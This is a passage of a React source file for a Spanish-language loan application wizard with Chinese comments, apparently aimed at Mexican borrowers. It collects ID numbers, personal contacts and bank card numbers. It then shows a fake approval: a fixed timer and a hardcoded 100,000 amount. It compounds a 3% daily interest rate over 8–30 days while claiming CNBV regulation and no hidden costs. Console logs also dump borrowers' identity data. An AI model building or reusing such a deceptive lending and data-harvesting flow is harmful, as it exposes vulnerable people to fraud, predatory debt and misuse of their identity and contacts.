          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第6步：征信授权
const Step6CreditAuthorization: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [hasRead, setHasRead] = useState(false);
  const [agreed, setAgreed] = useState(false);

  const handleScroll = (e: React.UIEvent<HTMLDivElement>) => {
    const element = e.currentTarget;
    // 使用更宽松的判断条件，允许1像素的误差
    const bottom = element.scrollHeight - element.scrollTop <= element.clientHeight + 1;
    if (bottom) {
      setHasRead(true);
    }
  };

  const handleNext = () => {
    if (!agreed) {
      alert(t('errors.required'));
      return;
    }
    const stepData = { agreed, hasRead };
    if (updateApplicationStep) {
      updateApplicationStep(6, stepData);
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step6.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step6.subtitle')}</p>
      </div>

      <div className="border rounded-lg">
        <div className="bg-gray-50 px-4 py-3 border-b">
          <h4 className="font-semibold">{t('loanWizard.step6.creditAgreementTitle')}</h4>
        </div>
        <div
          className="p-4 h-64 overflow-y-auto text-sm leading-relaxed"
          onScroll={handleScroll}
        >
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementPurpose')}</strong><br />
            {t('loanWizard.step6.agreementPurposeDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementScope')}</strong><br />
            {t('loanWizard.step6.agreementScopeDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementPrivacy')}</strong><br />
            {t('loanWizard.step6.agreementPrivacyDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementPeriod')}</strong><br />
            {t('loanWizard.step6.agreementPeriodDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementOther')}</strong><br />
            {t('loanWizard.step6.agreementOtherDesc')}
          </p>
          <p className="mb-4">
            {t('loanWizard.step6.agreementExplanation')}
          </p>
          <div className="text-center py-4">
            {hasRead ? (
              <div className="text-green-600 font-medium">✓ 您已阅读完整协议</div>
            ) : (
              <div className="space-y-2">
                <div className="text-gray-500">请滑动到底部阅读完整协议</div>
                <button
                  onClick={() => setHasRead(true)}
                  className="text-blue-600 hover:text-blue-800 text-sm underline"
                >
                  我已阅读完整协议
                </button>
              </div>
            )}
          </div>
        </div>
      </div>

      <div className="flex items-center space-x-3">
        <input
          type="checkbox"
          id="credit-agreement"
          checked={agreed}
          onChange={(e) => setAgreed(e.target.checked)}
          disabled={!hasRead}
          className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
        />
        <label htmlFor="credit-agreement" className="text-sm text-gray-700">
          {t('loanWizard.step6.creditAuthorizationLabel')}
        </label>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          disabled={!agreed}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {t('loanWizard.step6.agreeAndContinueButton')}
        </button>
      </div>
    </div>
  );
};

// 第7步：银行卡信息
const Step7BankCard: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [bankCardNumber, setBankCardNumber] = useState(data.bankCardNumber || '');

  const formatCardNumber = (value: string) => {
    // 移除所有非数字字符
    const numbers = value.replace(/\D/g, '');
    // 每4位添加一个空格
    return numbers.replace(/(\d{4})/g, '$1 ').trim();
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setBankCardNumber(formatted);
  };

  const handleNext = () => {
    const cleanCardNumber = bankCardNumber.replace(/\s/g, '');
    if (!cleanCardNumber || cleanCardNumber.length < 16) {
      alert(t('errors.invalid'));
      return;
    }
    const stepData = { bankCardNumber: cleanCardNumber };
    onUpdate(stepData);
    if (updateApplicationStep) {
      updateApplicationStep(7, stepData);
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step7.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step7.subtitle')}</p>
      </div>

      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step7.bankCardLabel')}
          </label>
          <input
            type="text"
            value={bankCardNumber}
            onChange={handleCardNumberChange}
            placeholder={t('loanWizard.step7.bankCardPlaceholder')}
            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg tracking-wider"
            maxLength={23} // 16位数字 + 3个空格
            style={{ maxWidth: "100%" }}
          />
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step7.securityHintTitle')}</h4>
          <ul className="text-sm text-blue-700 space-y-1">
            <li>{t('loanWizard.step7.securityHint1')}</li>
            <li>{t('loanWizard.step7.securityHint2')}</li>
            <li>{t('loanWizard.step7.securityHint3')}</li>
          </ul>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第8步：提交贷款申请
const Step8SubmitApplication: React.FC<StepProps> = ({ data, onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async () => {
    setIsSubmitting(true);
    try {
      // 模拟提交过程
      await new Promise(resolve => setTimeout(resolve, 2000));
      const stepData = { submitted: true, submittedAt: Date.now() };
      if (updateApplicationStep) {
        await updateApplicationStep(8, stepData);
      }
      onNext();
    } catch (error) {
      console.error('Submit failed:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step8.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step8.subtitle')}</p>
      </div>

      <div className="bg-gray-50 rounded-lg p-6">
        <h4 className="font-semibold mb-4">{t('loanWizard.step8.applicationSummaryTitle')}</h4>
        <div className="space-y-3 text-sm">
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.phoneLabel')}:</span>
            <span>{data.phone}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.realNameLabel')}:</span>
            <span>{data.realName}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.idNumberLabel')}:</span>
            <span>{data.idNumber}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.contact1Label')}:</span>
            <span>{data.contact1Name} ({data.contact1Phone})</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.contact2Label')}:</span>
            <span>{data.contact2Name} ({data.contact2Phone})</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.bankCardLabel')}:</span>
            <span>****{data.bankCardNumber?.slice(-4)}</span>
          </div>
        </div>
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step8.importantHintTitle')}</h4>
        <ul className="text-sm text-blue-700 space-y-1">
          <li>{t('loanWizard.step8.importantHint1')}</li>
          <li>{t('loanWizard.step8.importantHint2')}</li>
          <li>{t('loanWizard.step8.importantHint3')}</li>
          <li>{t('loanWizard.step8.importantHint4')}</li>
        </ul>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
          disabled={isSubmitting}
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleSubmit}
          disabled={isSubmitting}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50"
        >
          {isSubmitting ? t('loanWizard.step8.submittingText') : t('loanWizard.step8.submitApplicationButton')}
        </button>
      </div>
    </div>
  );
};

// 第9步：审批中
const Step9Processing: React.FC<StepProps> = ({ onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [timeLeft, setTimeLeft] = useState(10);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          const stepData = { processed: true, processedAt: Date.now() };
          if (updateApplicationStep) {
            updateApplicationStep(9, stepData);
          }
          onNext();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [onNext, updateApplicationStep]);

  return (
    <div className="space-y-6 text-center">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step9.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step9.subtitle')}</p>
      </div>

      <div className="py-12">
        <div className="w-16 h-16 mx-auto mb-6 relative">
          <div className="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
          <div className="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
        </div>
        <div className="text-lg font-medium text-blue-600 mb-2">
          {t('loanWizard.step9.processingTitle')}
        </div>
        <div className="text-sm text-gray-500">
          {t('loanWizard.step9.timeLeft', { time: timeLeft })}
        </div>
      </div>

      <div className="bg-gray-50 rounded-lg p-6">
        <h4 className="font-semibold mb-4">{t('loanWizard.step9.auditProcessTitle')}</h4>
        <div className="space-y-3">
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
              <span className="text-white text-xs">✓</span>
            </div>
            <span className="text-sm">{t('loanWizard.step9.identityVerification')}</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
              <span className="text-white text-xs">✓</span>
            </div>
            <span className="text-sm">{t('loanWizard.step9.creditAuthorization')}</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center animate-pulse">
              <span className="text-white text-xs">?</span>
            </div>
            <span className="text-sm">{t('loanWizard.step9.riskControl')}</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
              <span className="text-white text-xs">-</span>
            </div>
            <span className="text-sm text-gray-400">{t('loanWizard.step9.finalApproval')}</span>
          </div>
        </div>
      </div>
    </div>
  );
};

// 第10步：审批通过
const Step10Approved: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const approvedAmount = 100000; // 模拟审批金额

  return (
    <div className="space-y-6 text-center">
      <div>
        <div className="w-20 h-20 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
          <span className="text-4xl">🎉</span>
        </div>
        <h3 className="text-2xl font-bold text-green-600 mb-2">{t('loanWizard.step10.congratulationsTitle')}</h3>
        <p className="text-gray-600">{t('loanWizard.step10.approvedDesc')}</p>
      </div>

      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
        <h4 className="font-semibold text-green-800 mb-4">{t('loanWizard.step10.approvalResultTitle')}</h4>
        <div className="space-y-2">
          <div className="text-3xl font-bold text-green-600">
            ${approvedAmount.toLocaleString()}
          </div>
          <div className="text-sm text-green-700">{t('loanWizard.step10.approvedAmountDesc')}</div>
        </div>
      </div>

      <div className="space-y-4">
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step10.loanConditionsTitle')}</h4>
          <div className="text-sm text-blue-700 space-y-1">
            <div>{t('loanWizard.step10.interestRate')}</div>
            <div>{t('loanWizard.step10.installmentOptions')}</div>
            <div>{t('loanWizard.step10.noPreFee')}</div>
            <div>{t('loanWizard.step10.earlyRepayment')}</div>
          </div>
        </div>

        <button
          onClick={() => {
            const stepData = { approved: true, approvedAmount, approvedAt: Date.now() };
            if (updateApplicationStep) {
              updateApplicationStep(10, stepData);
            }
            onNext();
          }}
          className="w-full px-6 py-4 bg-green-600 text-white rounded-lg hover:bg-green-700 font-medium text-lg"
        >
          {t('loanWizard.step10.withdrawNowButton')}
        </button>
      </div>
    </div>
  );
};

// 第11步：提现设置
const Step11Withdrawal: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [withdrawalAmount, setWithdrawalAmount] = useState(data.withdrawalAmount || '');
  const [installmentPeriod, setInstallmentPeriod] = useState(data.installmentPeriod || 30);
  const maxAmount = 100000;

  const calculateTotalRepayment = (principal: number, days: number) => {
    const dailyRate = 0.03; // 3% 日利率
    const totalRepayment = principal * Math.pow(1 + dailyRate, days);
    return totalRepayment;
  };

  const calculateRepaymentDate = (days: number) => {
    const today = new Date();
    const repaymentDate = new Date(today.getTime());
    repaymentDate.setDate(today.getDate() + days);
    return repaymentDate.toLocaleDateString('es-MX', { 
      year: 'numeric', 
      month: 'long', 
      day: 'numeric' 
    });
  };

  const handleNext = () => {
    const amount = parseFloat(withdrawalAmount.toString());
    if (!amount || amount <= 0 || amount > maxAmount) {
      alert(t('errors.invalid'));
      return;
    }
    const stepData = { withdrawalAmount: amount, installmentPeriod };
    onUpdate(stepData);
    if (updateApplicationStep) {
      updateApplicationStep(11, stepData);
    }
    onNext();
  };

  const totalRepayment = withdrawalAmount ? calculateTotalRepayment(parseFloat(withdrawalAmount.toString()), installmentPeriod) : 0;
  const repaymentDate = withdrawalAmount ? calculateRepaymentDate(installmentPeriod) : '';

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step11.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step11.subtitle')}</p>
      </div>

      <div className="space-y-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step11.withdrawalAmountLabel')}
          </label>
          <input
            type="number"
            value={withdrawalAmount}
            onChange={(e) => setWithdrawalAmount(e.target.value)}
            placeholder={t('loanWizard.step11.withdrawalAmountPlaceholder')}
            max={maxAmount.toString()}
            min="1000"
            step="100"
            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg"
            style={{ maxWidth: "100%" }}
          />
          <div className="mt-2 text-sm text-gray-500">
            {t('loanWizard.step11.withdrawalRangeLabel', { maxAmount: maxAmount.toLocaleString() })}
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step11.installmentPeriodLabel')}
          </label>
          <div className="grid grid-cols-3 gap-3">
            {[8, 15, 30].map((period) => (
              <button
                key={period}
                onClick={() => setInstallmentPeriod(period)}
                className={`p-3 border rounded-lg text-center transition-colors ${installmentPeriod === period
                  ? 'border-blue-500 bg-blue-50 text-blue-600'
                  : 'border-gray-300 hover:border-gray-400'
                  }`}
              >
                <div className="font-medium">{period}{t('loanWizard.step11.installmentPeriodSuffix')}</div>
                <div className="text-sm text-gray-500">{period}{t('loanWizard.step11.installmentMonths')}</div>
              </button>
            ))}
          </div>
        </div>

        {withdrawalAmount && (
          <div className="bg-gray-50 rounded-lg p-4">
            <h4 className="font-semibold mb-3">{t('loanWizard.step11.repaymentPlanTitle')}</h4>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.loanAmountLabel')}:</span>
                <span>${parseFloat(withdrawalAmount.toString()).toLocaleString()}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.installmentPeriodLabel')}:</span>
                <span>{installmentPeriod}{t('loanWizard.step11.installmentPeriodSuffix')}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.interestRateLabel')}:</span>
                <span>3%</span>
              </div>
              <hr className="my-2" />
              <div className="flex justify-between font-medium">
                <span>{t('loanWizard.step11.monthlyPaymentLabel')}:</span>
                <span className="text-blue-600">{repaymentDate}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.totalRepaymentLabel')}:</span>
                <span>${totalRepayment.toFixed(2)}</span>
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第12步：提现完成
const Step12Complete: React.FC<StepProps> = ({ data, updateApplicationStep }) => {
  const { t } = useTranslation();

  // 在组件加载时记录完成状态
  useEffect(() => {
    const stepData = {
      completed: true,
      completedAt: Date.now(),
      withdrawalAmount: data.withdrawalAmount,
      installmentPeriod: data.installmentPeriod
    };
    if (updateApplicationStep) {
      updateApplicationStep(12, stepData);
    }
    
    // 追踪贷款申请完成事件
    if (data.withdrawalAmount) {
      trackLoanApplicationComplete(data.withdrawalAmount, 'personal');
    }
  }, [updateApplicationStep, data.withdrawalAmount, data.installmentPeriod]);

  return (
    <div className="space-y-6 text-center">
      <div>
        <div className="w-20 h-20 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
          <span className="text-4xl">✅</span>
        </div>
        <h3 className="text-2xl font-bold text-green-600 mb-2">{t('loanWizard.step12.successTitle')}</h3>
        <p className="text-gray-600">{t('loanWizard.step12.successDesc')}</p>
      </div>

      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
        <h4 className="font-semibold text-green-800 mb-4">{t('loanWizard.step12.withdrawalDetailsTitle')}</h4>
        <div className="space-y-3 text-sm">
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.withdrawalAmountLabel')}:</span>
            <span className="font-medium">${data.withdrawalAmount?.toLocaleString()}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.arrivalBankCardLabel')}:</span>
            <span>****{data.bankCardNumber?.slice(-4)}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.installmentPeriodLabel')}:</span>
            <span>{data.installmentPeriod}{t('loanWizard.step11.installmentPeriodSuffix')}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.arrivalTimeLabel')}:</span>
            <span>{t('loanWizard.step12.arrivalTimeValue')}</span>
          </div>
        </div>
      </div>

      <div className="space-y-4">
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step12.tipsTitle')}</h4>
          <ul className="text-sm text-blue-700 space-y-1 text-left">
            <li>{t('loanWizard.step12.tips1')}</li>
            <li>{t('loanWizard.step12.tips2')}</li>
            <li>{t('loanWizard.step12.tips3')}</li>
            <li>{t('loanWizard.step12.tips4')}</li>
          </ul>
        </div>

        <div className="flex gap-3">
          <button
            onClick={() => window.location.href = '/user-center'}
            className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
          >
            {t('loanWizard.step12.viewRepaymentPlanButton')}
          </button>
          <button
            onClick={() => window.location.href = '/'}
            className="flex-1 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
          >
            {t('loanWizard.step12.returnHomeButton')}
          </button>
        </div>
      </div>
    </div>
  );
};

// 主向导组件
// Main component for the loan application wizard
const LoanWizard: React.FC = () => {
  const { t } = useTranslation();
  const [currentStep, setCurrentStep] = useState(1);
  const [applicationData, setApplicationData] = useState<LoanApplication>({ step: 1 });
  const totalSteps = 12;

  // 初始化访客申请
  useEffect(() => {
    // 检查浏览器兼容性
    checkBrowserCompatibility();
    
    if (!applicationData.id) {
      createGuestApplication();
      // 追踪贷款申请开始事件
      trackLoanApplicationStart('personal');
    }
  }, []);

  const createGuestApplication = async () => {
    console.log('=== createGuestApplication called ===');
    const sessionId = safeStorage.getItem('sessionId') || 'guest-' + Date.now();
    safeStorage.setItem('sessionId', sessionId);
    console.log('🔑 Session ID:', sessionId);

    try {
      console.log('🚀 Creating guest application...');
      
      const result = await httpClient.postJson('/api/applications/guest', {}, {
        headers: {
          'X-Session-ID': sessionId
        }
      }) as {
        success: boolean;
        applicationId: string;
        sessionId: string;
        message?: string;
      };

      console.log('✅ Guest application result:', result);

      const newData = {
        id: result.applicationId,
        sessionId: result.sessionId,
        isGuest: true
      };
      console.log('📝 Setting application data:', newData);

      setApplicationData(prev => ({
        ...prev,
        ...newData
      }));
    } catch (error) {
      console.error('❌ Failed to create guest application:', error);
      // 如果创建失败，生成一个临时ID以便继续流程
      const fallbackData = {
        id: crypto.randomUUID(),
        sessionId: sessionId,
        isGuest: true
      };
      setApplicationData(prev => ({
        ...prev,
        ...fallbackData
      }));
    }
  };

  const updateApplicationStep = async (step: number, stepData: any) => {
    console.log('=== updateApplicationStep called ===');
    console.log('Step:', step);
    console.log('StepData:', stepData);
    console.log('ApplicationData.id:', applicationData.id);
    console.log('ApplicationData.phone:', applicationData.phone);
    console.log('ApplicationData.isGuest:', applicationData.isGuest);

    if (!applicationData.id) {
      console.error('❌ No application ID found!');
      return;
    }

    try {
      const requestBody = {
        step,
        data: stepData,
        phone: applicationData.phone
      };
      console.log('📤 Request body:', JSON.stringify(requestBody, null, 2));

      const result = await httpClient.putJson(`/api/applications/${applicationData.id}/step`, requestBody);
      console.log('✅ Step update result:', result);
    } catch (error) {
      console.error('❌ Failed to update application step:', error);
      // 不阻断用户流程，允许继续下一步
    }
  };

  const updateData = (newData: Partial<LoanApplication>) => {
    console.log('=== updateData called ===');
    console.log('Previous applicationData:', applicationData);
    console.log('New data to merge:', newData);

    setApplicationData(prev => {
      const updated = { ...prev, ...newData };
      console.log('Updated applicationData:', updated);
      return updated;
    });
  };

  const nextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
      // 更新申请步骤
      updateApplicationStep(currentStep + 1, applicationData);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const renderStep = () => {
    const stepProps = {
      data: applicationData,
      onUpdate: updateData,
      onNext: nextStep,
      onBack: prevStep,
      updateApplicationStep
    };

    switch (currentStep) {
      case 1:
        return <Step1UserRegistration {...stepProps} />;
      case 2:
        return <Step2Identity {...stepProps} />;
      case 3:
        return <Step3IdUpload {...stepProps} />;
      case 4:
        return <Step4Contacts {...stepProps} />;
      case 5:
        return <Step5LivenessDetection {...stepProps} />;
      case 6:
        return <Step6CreditAuthorization {...stepProps} />;
      case 7:
        return <Step7BankCard {...stepProps} />;
      case 8:
        return <Step8SubmitApplication {...stepProps} />;
      case 9:
        return <Step9Processing {...stepProps} />;
      case 10:
        return <Step10Approved {...stepProps} />;
      case 11:
        return <Step11Withdrawal {...stepProps} />;
      case 12:
        return <Step12Complete {...stepProps} />;
      default:
        return <div>未知步骤</div>;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100">
      {/* 桌面端Full-width，移动端适配 */}
      <div className="w-full">
        {/* 进度条 - 固定在顶部 */}
        <div className="bg-white border-b border-slate-200 shadow-sm">
          <div className="max-w-6xl mx-auto px-4 py-4 lg:py-6">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center space-x-3">
                <h2 className="text-lg lg:text-xl font-bold text-slate-800">
                  Solicitud de Préstamo
                </h2>
                <div className="hidden lg:flex items-center space-x-2 text-sm text-slate-600">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  <span>Proceso seguro y encriptado</span>
                </div>
              </div>
              <div className="text-right">
                <div className="text-sm font-semibold text-slate-800">
                  Paso {currentStep} de {totalSteps}
                </div>
                <div className="text-xs text-slate-500">
                  {Math.round((currentStep / totalSteps) * 100)}% completado
                </div>
              </div>
            </div>
            
            {/* 进度条 */}
            <div className="w-full bg-slate-200 rounded-full h-2">
              <div
                className="bg-gradient-to-r from-slate-700 to-slate-800 h-2 rounded-full transition-all duration-500 ease-out"
                style={{ width: `${(currentStep / totalSteps) * 100}%` }}
              ></div>
            </div>
          </div>
        </div>

        {/* 主内容区域 */}
        <div className="w-full">
          {/* 桌面端：Full-width容器，移动端：适配容器 */}
          <div className="max-w-6xl mx-auto px-4 py-6 lg:py-8">
            <div className="flex flex-col lg:flex-row lg:space-x-8">
              {/* 左侧：步骤内容 (桌面端占2/3，移动端全宽) */}
              <div className="flex-1 lg:max-w-3xl">
                <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden">
                  {renderStep()}
                </div>
              </div>

              {/* 右侧：信息面板 (桌面端显示，移动端隐藏) */}
              <div className="hidden lg:block lg:w-80 xl:w-96">
                <div className="sticky top-24 space-y-6">
                  {/* 安全保障 */}
                  <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
                    <h3 className="font-bold text-slate-800 text-lg mb-4">
                      Garantías de Seguridad
                    </h3>
                    <div className="space-y-4">
                      <div className="flex items-start space-x-3">
                        <div className="w-8 h-8 bg-emerald-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                          </svg>
                        </div>
                        <div>
                          <h4 className="font-semibold text-slate-800 text-sm">Encriptación SSL</h4>
                          <p className="text-slate-600 text-xs">Datos protegidos con tecnología bancaria</p>
                        </div>
                      </div>
                      <div className="flex items-start space-x-3">
                        <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                          </svg>
                        </div>
                        <div>
                          <h4 className="font-semibold text-slate-800 text-sm">Regulado CNBV</h4>
                          <p className="text-slate-600 text-xs">Autorizado por autoridades financieras</p>
                        </div>
                      </div>
                      <div className="flex items-start space-x-3">
                        <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
                            <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg>
                        </div>
                        <div>
                          <h4 className="font-semibold text-slate-800 text-sm">Proceso Transparente</h4>
                          <p className="text-slate-600 text-xs">Sin costos ocultos ni sorpresas</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* ventajas del préstamo */}
                  <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
                    <h3 className="font-bold text-slate-800 text-lg mb-4">
                      ¿Por qué elegirnos?
                    </h3>
                    <div className="space-y-3">
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Aprobación en minutos</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Tasas competitivas</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Sin penalizaciones</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Soporte 24/7</span>
                      </div>
                    </div>
                  </div>

                  {/* contacto de ayuda */}
                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
                    <h3 className="font-semibold text-slate-800 text-base mb-3">
                      ¿Necesitas ayuda?
                    </h3>
                    <p className="text-slate-600 text-sm mb-4">
                      Nuestro equipo está disponible para asistirte durante todo el proceso.
                    </p>
                    <div className="space-y-2 text-sm">
                      <div className="flex items-center space-x-2 text-slate-700">
                        <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
